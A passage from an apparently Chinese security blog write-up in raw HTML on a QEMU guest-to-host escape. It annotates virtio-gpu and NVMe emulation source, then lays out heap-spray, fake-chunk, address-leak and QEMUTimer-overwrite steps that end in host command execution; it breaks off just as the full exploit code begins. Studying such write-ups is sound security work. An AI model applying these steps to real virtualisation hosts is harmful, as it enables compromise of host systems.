&#125;<br><span class="hljs-comment">//更新i</span><br>    i = head;<br><span class="hljs-comment">//获取caches信息</span><br>    caches = vring_get_region_caches(vq);<br>    <span class="hljs-keyword">if</span> (!caches) &#123;<br>        virtio_error(vdev, <span class="hljs-string">&quot;Region caches not initialized&quot;</span>);<br>        <span class="hljs-keyword">goto</span> done;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (caches-&gt;desc.len &lt; max * <span class="hljs-keyword">sizeof</span>(VRingDesc)) &#123;<br>        virtio_error(vdev, <span class="hljs-string">&quot;Cannot map descriptor ring&quot;</span>);<br>        <span class="hljs-keyword">goto</span> done;<br>    &#125;<br><br>    desc_cache = &amp;caches-&gt;desc;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    vring_split_desc_read函数将(vq-&gt;vring-&gt;desc +  i * sizeof(VRingDesc))虚拟机物理地址中</span><br><span class="hljs-comment">    的VRingDesc结构体赋值给desc</span><br><span class="hljs-comment">    */</span><br>    vring_split_desc_read(vdev, &amp;desc, desc_cache, i);<br>    <span class="hljs-keyword">if</span> (desc.flags &amp; VRING_DESC_F_INDIRECT) &#123;<br>        <span class="hljs-keyword">if</span> (!desc.len || (desc.len % <span class="hljs-keyword">sizeof</span>(VRingDesc))) &#123;<br>            virtio_error(vdev, <span class="hljs-string">&quot;Invalid size for indirect buffer table&quot;</span>);<br>            <span class="hljs-keyword">goto</span> done;<br>        &#125;<br><br>        <span class="hljs-comment">/* loop over the indirect descriptor table */</span><br>        len = address_space_cache_init(&amp;indirect_desc_cache, vdev-&gt;dma_as,<br>                                       desc.addr, desc.len, <span class="hljs-literal">false</span>);<br>        desc_cache = &amp;indirect_desc_cache;<br>        <span class="hljs-keyword">if</span> (len &lt; desc.len) &#123;<br>            virtio_error(vdev, <span class="hljs-string">&quot;Cannot map indirect buffer&quot;</span>);<br>            <span class="hljs-keyword">goto</span> done;<br>        &#125;<br><br>        max = desc.len / <span class="hljs-keyword">sizeof</span>(VRingDesc);<br>        i = <span class="hljs-number">0</span>;<br>        vring_split_desc_read(vdev, &amp;desc, desc_cache, i);<br>    &#125;<br><br>    <span class="hljs-comment">/* Collect all the descriptors */</span><br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-type">bool</span> map_ok;<br><br>        <span class="hljs-keyword">if</span> (desc.flags &amp; VRING_DESC_F_WRITE) &#123;<br>            map_ok = virtqueue_map_desc(vdev, &amp;in_num, addr + out_num,<br>                                        iov + out_num,<br>                                        VIRTQUEUE_MAX_SIZE - out_num, <span class="hljs-literal">true</span>,<br>                                        desc.addr, desc.len);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (in_num) &#123;<br>                virtio_error(vdev, <span class="hljs-string">&quot;Incorrect order for descriptors&quot;</span>);<br>                <span class="hljs-keyword">goto</span> err_undo_map;<br>            &#125;<br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">            virtqueue_map_desc函数的效果如下:</span><br><span class="hljs-comment">            iov[out_num].iov_base = dma_memory_map函数映射desc.addr地址后的值</span><br><span class="hljs-comment">            iov[out_num].iov_len = desc.len</span><br><span class="hljs-comment">            out_num ++</span><br><span class="hljs-comment">            */</span><br>            map_ok = virtqueue_map_desc(vdev, &amp;out_num, addr, iov,<br>                                        VIRTQUEUE_MAX_SIZE, <span class="hljs-literal">false</span>,<br>                                        desc.addr, desc.len);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!map_ok) &#123;<br>            <span class="hljs-keyword">goto</span> err_undo_map;<br>        &#125;<br><br>        <span class="hljs-comment">/* If we&#x27;ve got too many, that implies a descriptor loop. */</span><br>        <span class="hljs-keyword">if</span> (++elem_entries &gt; max) &#123;<br>            virtio_error(vdev, <span class="hljs-string">&quot;Looped descriptor&quot;</span>);<br>            <span class="hljs-keyword">goto</span> err_undo_map;<br>        &#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">virtqueue_split_read_next_desc函数的作用为：判断desc.flag标志，i = desc-&gt;next，</span><br><span class="hljs-comment">使用vring_split_desc_read获取下一个VRingDesc结构体</span><br><span class="hljs-comment">*/</span><br>        rc = virtqueue_split_read_next_desc(vdev, &amp;desc, desc_cache, max, &amp;i);<br>    &#125; <span class="hljs-keyword">while</span> (rc == VIRTQUEUE_READ_DESC_MORE);<br><br>    <span class="hljs-keyword">if</span> (rc == VIRTQUEUE_READ_DESC_ERROR) &#123;<br>        <span class="hljs-keyword">goto</span> err_undo_map;<br>    &#125;<br><br>    <span class="hljs-comment">/* Now copy what we have collected and mapped */</span><br>    elem = virtqueue_alloc_element(sz, out_num, in_num);<br>    elem-&gt;index = head;<br>    elem-&gt;ndescs = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; out_num; i++) &#123;<br>        elem-&gt;out_addr[i] = addr[i];<br>        elem-&gt;out_sg[i] = iov[i];<br>    &#125;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; in_num; i++) &#123;<br>        elem-&gt;in_addr[i] = addr[out_num + i];<br>        elem-&gt;in_sg[i] = iov[out_num + i];<br>    &#125;<br><br>    vq-&gt;inuse++;<br><br>    trace_virtqueue_pop(vq, elem, elem-&gt;in_num, elem-&gt;out_num);<br>done:<br>    address_space_cache_destroy(&amp;indirect_desc_cache);<br><br>    <span class="hljs-keyword">return</span> elem;<br><br>err_undo_map:<br>    virtqueue_undo_map_desc(out_num, in_num, iov);<br>    <span class="hljs-keyword">goto</span> done;<br>&#125;<br></code></pre></td></tr></table></figure><p>​                                          </p><p>取得cmd后进入virtio_gpu_simple_process_cmd，首先就是调用VIRTIO_GPU_FILL_CMD，这个宏实际上就是将上面virtqueue_split_pop函数中第一个VirtIODevice结构体的addr中的值拷贝到cmd-&gt;cmd_hdr，然后通过switch进入相应的功能</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_GPU_FILL_CMD(out) do &#123;                                   \</span><br><span class="hljs-meta">        size_t s;                                                       \</span><br><span class="hljs-meta">        s = iov_to_buf(cmd-&gt;elem.out_sg, cmd-&gt;elem.out_num, 0,          \</span><br><span class="hljs-meta">                       &amp;out, sizeof(out));                              \</span><br><span class="hljs-meta">        <span class="hljs-keyword">if</span> (s != sizeof(out)) &#123;                                         \</span><br><span class="hljs-meta">            qemu_log_mask(LOG_GUEST_ERROR,                              \</span><br><span class="hljs-meta">                          <span class="hljs-string">&quot;%s: command size incorrect %zu vs %zu\n&quot;</span>,    \</span><br><span class="hljs-meta">                          __func__, s, sizeof(out));                    \</span><br><span class="hljs-meta">            return;                                                     \</span><br><span class="hljs-meta">        &#125;                                                               \</span><br><span class="hljs-meta">    &#125; while (0)</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">virtio_gpu_simple_process_cmd</span><span class="hljs-params">(VirtIOGPU *g,</span><br><span class="hljs-params">                                          <span class="hljs-keyword">struct</span> virtio_gpu_ctrl_command *cmd)</span><br>&#123;<br>    VIRTIO_GPU_FILL_CMD(cmd-&gt;cmd_hdr);<br>    virtio_gpu_ctrl_hdr_bswap(&amp;cmd-&gt;cmd_hdr);<br><br>    <span class="hljs-keyword">switch</span> (cmd-&gt;cmd_hdr.type) &#123;<br><br>………………<br>    ………………<br><br>    <span class="hljs-keyword">case</span> VIRTIO_GPU_CMD_RESOURCE_ATTACH_BACKING:<br>        virtio_gpu_resource_attach_backing(g, cmd);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> VIRTIO_GPU_CMD_RESOURCE_DETACH_BACKING:<br>        virtio_gpu_resource_detach_backing(g, cmd);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        cmd-&gt;error = VIRTIO_GPU_RESP_ERR_UNSPEC;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!cmd-&gt;finished) &#123;<br>        virtio_gpu_ctrl_response_nodata(g, cmd, cmd-&gt;error ? cmd-&gt;error :<br>                                        VIRTIO_GPU_RESP_OK_NODATA);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>virtio_gpu_resource_attach_backing函数中要顺利调用virtio_gpu_create_mapping_iov，还要<code>virtio_gpu_find_resource(g, ab.resource_id)</code>返回的virtio_gpu_simple_resource结构体满足一些条件，所以事先调用virtio_gpu_resource_create_2d函数创建一个virtio_gpu_simple_resource结构体，通过ab.resource_id找到相应的virtio_gpu_simple_resource结构体，之后就能进入virtio_gpu_create_mapping_iov函数了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">virtio_gpu_resource_attach_backing</span><span class="hljs-params">(VirtIOGPU *g,</span><br><span class="hljs-params">                                   <span class="hljs-keyword">struct</span> virtio_gpu_ctrl_command *cmd)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_simple_resource</span> *<span class="hljs-title">res</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_resource_attach_backing</span> <span class="hljs-title">ab</span>;</span><br>    <span class="hljs-type">int</span> ret;<br><br>    VIRTIO_GPU_FILL_CMD(ab);<br>    virtio_gpu_bswap_32(&amp;ab, <span class="hljs-keyword">sizeof</span>(ab));<br>    trace_virtio_gpu_cmd_res_back_attach(ab.resource_id);<br><br>    res = virtio_gpu_find_resource(g, ab.resource_id);<br>    <span class="hljs-keyword">if</span> (!res) &#123;<br>        qemu_log_mask(LOG_GUEST_ERROR, <span class="hljs-string">&quot;%s: illegal resource specified %d\n&quot;</span>,<br>                      __func__, ab.resource_id);<br>        cmd-&gt;error = VIRTIO_GPU_RESP_ERR_INVALID_RESOURCE_ID;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (res-&gt;iov) &#123;<br>        cmd-&gt;error = VIRTIO_GPU_RESP_ERR_UNSPEC;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    ret = virtio_gpu_create_mapping_iov(g, &amp;ab, cmd, &amp;res-&gt;addrs, &amp;res-&gt;iov);<br>    <span class="hljs-keyword">if</span> (ret != <span class="hljs-number">0</span>) &#123;<br>        cmd-&gt;error = VIRTIO_GPU_RESP_ERR_UNSPEC;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    res-&gt;iov_cnt = ab.nr_entries;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">virtio_gpu_resource_create_2d</span><span class="hljs-params">(VirtIOGPU *g,</span><br><span class="hljs-params">                                          <span class="hljs-keyword">struct</span> virtio_gpu_ctrl_command *cmd)</span><br>&#123;<br>………………<br>    ………………<br>    <br>    <span class="hljs-keyword">if</span> (c2d.resource_id == <span class="hljs-number">0</span>) &#123;<br>        qemu_log_mask(LOG_GUEST_ERROR, <span class="hljs-string">&quot;%s: resource id 0 is not allowed\n&quot;</span>,<br>                      __func__);<br>        cmd-&gt;error = VIRTIO_GPU_RESP_ERR_INVALID_RESOURCE_ID;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    res = virtio_gpu_find_resource(g, c2d.resource_id);<br>    <span class="hljs-keyword">if</span> (res) &#123;<br>        qemu_log_mask(LOG_GUEST_ERROR, <span class="hljs-string">&quot;%s: resource already exists %d\n&quot;</span>,<br>                      __func__, c2d.resource_id);<br>        cmd-&gt;error = VIRTIO_GPU_RESP_ERR_INVALID_RESOURCE_ID;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    res = g_new0(<span class="hljs-keyword">struct</span> virtio_gpu_simple_resource, <span class="hljs-number">1</span>);<br><br>    res-&gt;width = c2d.width;<br>    res-&gt;height = c2d.height;<br>    res-&gt;format = c2d.format;<br>    res-&gt;resource_id = c2d.resource_id;<br><br>………………<br>    ………………<br><br>    QTAILQ_INSERT_HEAD(&amp;g-&gt;reslist, res, next);<br>    g-&gt;hostmem += res-&gt;hostmem;<br>&#125;<br></code></pre></td></tr></table></figure><p>进入virtio_gpu_create_mapping_iov函数后就可以完成mapping table的设置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">virtio_gpu_create_mapping_iov</span><span class="hljs-params">(VirtIOGPU *g,</span><br><span class="hljs-params">                                  <span class="hljs-keyword">struct</span> virtio_gpu_resource_attach_backing *ab,</span><br><span class="hljs-params">                                  <span class="hljs-keyword">struct</span> virtio_gpu_ctrl_command *cmd,</span><br><span class="hljs-params">                                  <span class="hljs-type">uint64_t</span> **addr, <span class="hljs-keyword">struct</span> iovec **iov)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_mem_entry</span> *<span class="hljs-title">ents</span>;</span><br>    <span class="hljs-type">size_t</span> esize, s;<br>    <span class="hljs-type">int</span> i;<br><br>    <span class="hljs-keyword">if</span> (ab-&gt;nr_entries &gt; <span class="hljs-number">16384</span>) &#123;<br>        qemu_log_mask(LOG_GUEST_ERROR,<br>                      <span class="hljs-string">&quot;%s: nr_entries is too big (%d &gt; 16384)\n&quot;</span>,<br>                      __func__, ab-&gt;nr_entries);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    esize = <span class="hljs-keyword">sizeof</span>(*ents) * ab-&gt;nr_entries;<br>    ents = g_malloc(esize);<br>    s = iov_to_buf(cmd-&gt;elem.out_sg, cmd-&gt;elem.out_num,<br>                   <span class="hljs-keyword">sizeof</span>(*ab), ents, esize);<br>    <span class="hljs-keyword">if</span> (s != esize) &#123;<br>        qemu_log_mask(LOG_GUEST_ERROR,<br>                      <span class="hljs-string">&quot;%s: command data size incorrect %zu vs %zu\n&quot;</span>,<br>                      __func__, s, esize);<br>        g_free(ents);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    *iov = g_malloc0(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> iovec) * ab-&gt;nr_entries);<br>    <span class="hljs-keyword">if</span> (addr) &#123;<br>        *addr = g_malloc0(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>) * ab-&gt;nr_entries);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; ab-&gt;nr_entries; i++) &#123;<br>        <span class="hljs-type">uint64_t</span> a = le64_to_cpu(ents[i].addr);<br>        <span class="hljs-type">uint32_t</span> l = le32_to_cpu(ents[i].length);<br>        hwaddr len = l;<br>        (*iov)[i].iov_len = l;<br>        (*iov)[i].iov_base = dma_memory_map(VIRTIO_DEVICE(g)-&gt;dma_as,<br>                                            a, &amp;len, DMA_DIRECTION_TO_DEVICE);<br>        <span class="hljs-keyword">if</span> (addr) &#123;<br>            (*addr)[i] = a;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!(*iov)[i].iov_base || len != l) &#123;<br>            qemu_log_mask(LOG_GUEST_ERROR, <span class="hljs-string">&quot;%s: failed to map MMIO memory for&quot;</span><br>                          <span class="hljs-string">&quot; resource %d element %d\n&quot;</span>,<br>                          __func__, ab-&gt;resource_id, i);<br>            virtio_gpu_cleanup_mapping_iov(g, *iov, i);<br>            g_free(ents);<br>            *iov = <span class="hljs-literal">NULL</span>;<br>            <span class="hljs-keyword">if</span> (addr) &#123;<br>                g_free(*addr);<br>                *addr = <span class="hljs-literal">NULL</span>;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>    &#125;<br>    g_free(ents);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="具体利用流程"><a href="#具体利用流程" class="headerlink" title="具体利用流程"></a>具体利用流程</h2><ol><li>利用nvme_create_cq或者nvme_create_sq中的malloc原语来实现堆喷，获得稳定堆空间的布局。</li><li>构造mapping table，设置好qsg-&gt;sg的值是dma_memory_map后的地址，在后面释放这个地址时在qemu_sglist_destroy函数中有<code>object_unref(OBJECT(qsg-&gt;dev))</code>，需要通过这个函数里的判断，所以还需要设置qsg-&gt;dev的值是0。</li><li>构造完以后还需要释放，这里直接让dma_memory_map中的<code>len</code> 为0，函数的返回值就是0， 通过 <code>if (!(*iov)[i].iov_base || len != l)</code>这个判断后直接调用virtio_gpu_cleanup_mapping_iov函数释放。</li><li>创建一个sq ，在nvme_init_sq函数中有<code>sq-&gt;io_req = g_new(NvmeRequest, sq-&gt;size)</code>，申请堆内存的大小为<code>0xa0 * sq-&gt;size</code>，将之前释放的mapping table重新得到。</li><li>伪造chunk大小为0x290，通过漏洞函数直接释放掉虚拟机的内存，在伪造chunk的fd区域可以泄漏堆地址。</li><li>接下来去泄漏qemu中分配给虚拟机内存，通过virtqueue_split_pop函数中的<code>elem = virtqueue_alloc_element(sz, out_num, in_num)</code>可以得到伪造的chunk，virtqueue_split_pop函数中的dma_memory_map就可以在伪造的chunk中写入相应地址。</li><li>和之前一样继续构造mapping table，伪造chunk大小为0x40，使用漏洞函数释放虚拟机的内存；仍然是创建一个sq ，在nvme_init_sq中有<code>sq-&gt;timer = timer_new_ns(QEMU_CLOCK_VIRTUAL, nvme_process_sq, sq)</code>创建时间函数，timer就是使用0x40大小的chunk，从而使用伪造的chunk。</li><li>伪造的chunk中存在一个QEMUTimer结构体，可以泄漏nvme_process_sq函数地址得到qemu的基地址，最后修改cb和opaque就能实现任意命令执行。</li></ol><p>​                    </p><p>这里有个自己刚开始复现时忽视的问题：在nvme_map_prp中进入qemu_iovec_init函数后通过<code>g_new(struct iovec, alloc_hint)</code>申请堆块，申请的大小跟alloc_hint有关；如果申请的chunk也正好是0x40大小，在最后伪造chunk大小为0x40释放以后，由于之前已经被qemu_iovec_init函数申请了一个，0x40的tcache数量就会减1，伪造的chunk就会进入0x40的tcache中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">uint16_t</span> <span class="hljs-title function_">nvme_map_prp</span><span class="hljs-params">(QEMUSGList *qsg, QEMUIOVector *iov, <span class="hljs-type">uint64_t</span> prp1,</span><br><span class="hljs-params">                             <span class="hljs-type">uint64_t</span> prp2, <span class="hljs-type">uint32_t</span> len, NvmeCtrl *n)</span><br>&#123;<br>    hwaddr trans_len = n-&gt;page_size - (prp1 % n-&gt;page_size);<br>    trans_len = MIN(len, trans_len);<br>    <span class="hljs-type">int</span> num_prps = (len &gt;&gt; n-&gt;page_bits) + <span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">if</span> (unlikely(!prp1)) &#123;<br>        trace_nvme_err_invalid_prp();<br>        <span class="hljs-keyword">return</span> NVME_INVALID_FIELD | NVME_DNR;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (n-&gt;cmbsz &amp;&amp; prp1 &gt;= n-&gt;ctrl_mem.addr &amp;&amp;<br>               prp1 &lt; n-&gt;ctrl_mem.addr + int128_get64(n-&gt;ctrl_mem.size)) &#123;<br>        qsg-&gt;nsg = <span class="hljs-number">0</span>;<br>        qemu_iovec_init(iov, num_prps);<br>        qemu_iovec_add(iov, (<span class="hljs-type">void</span> *)&amp;n-&gt;cmbuf[prp1 - n-&gt;ctrl_mem.addr], trans_len);<br>    &#125;<br>    ………………<br>    ………………<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">qemu_iovec_init</span><span class="hljs-params">(QEMUIOVector *qiov, <span class="hljs-type">int</span> alloc_hint)</span><br>&#123;<br>    qiov-&gt;iov = g_new(<span class="hljs-keyword">struct</span> iovec, alloc_hint);<br>    qiov-&gt;niov = <span class="hljs-number">0</span>;<br>    qiov-&gt;nalloc = alloc_hint;<br>    qiov-&gt;size = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是QEMUTimer结构体是由calloc申请的，不会从tcache中取出chunk，只要设置好nvme_map_prp函数中len，接下来调用qemu_iovec_init中的<code>g_new(struct iovec, alloc_hint)</code>可以避免上述情况</p><img src="/img/22/Screenshot 2023-10-18 123922.png" style="zoom:67%;" /><p>​                             </p><p>说这个有什么用？因为我一开始nvme_map_prp函数的len参数没设置好，就出现上面这种情况，而且当时我并没有看出问题出在哪。</p><p>当时我还针对这种情况想了一个方法去完成利用：伪造chunk的大小为0x50，释放以后进入0x50大小的fastbin，利用nvme_init_sq函数中的<code>sq-&gt;io_req = g_new(NvmeRequest, sq-&gt;size)</code>实现一个大size的堆分配，伪造的chunk进入0x50大小的small bin，先前堆喷已经将0x40大小的small bin清空，calloc申请QEMUTimer结构体将由0x50大小的small bin提供</p><img src="/img/22/Screenshot 2023-10-18 135401.png" style="zoom: 67%;" /><p>调用完timer_new_ns后就可以照常利用了</p><img src="/img/22/Screenshot 2023-10-18 135521.png" style="zoom:80%;" /><p>这里不直接让伪造的chunk进入unsorted bin是因为<a href="https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L4311">free函数</a>会对chunk的地址进行判断：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">   <span class="hljs-keyword">if</span> (__builtin_expect (contiguous (av)<br>  &amp;&amp; (<span class="hljs-type">char</span> *) nextchunk<br>  &gt;= ((<span class="hljs-type">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="hljs-number">0</span>))<br>malloc_printerr (<span class="hljs-string">&quot;double free or corruption (out)&quot;</span>);<br></code></pre></td></tr></table></figure><p>后来仔细看了qemu_iovec_init函数才明白问题出在哪。把相应参数设置好以后完全不用怎么麻烦，当然最后也要保证0x40的tcache的数量为7，如果不够就释放一些sq或者cq，保证伪造的chunk释放后进入到fastbin。</p><p>​            </p><p>完整exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span 